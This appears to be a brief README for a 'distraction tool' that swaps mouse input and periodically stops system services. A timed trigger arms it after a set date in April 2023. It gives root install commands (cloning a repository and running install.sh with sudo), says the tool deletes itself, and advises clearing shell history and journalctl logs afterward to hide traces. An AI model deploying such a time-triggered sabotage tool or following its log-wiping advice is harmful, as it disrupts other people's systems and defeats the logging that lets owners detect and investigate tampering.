Distraction tool that switches mouse input and periodically turns services off (can only be automatically done after 17th april, 2023 at 5:13 PM

How to use:
git clone https://github.com/lans10/annoyance-tool
cd annoyance-tool
sudo bash install.sh

It will automatically delete itself.
Would recommend clearing history and journalctl after running these commands.
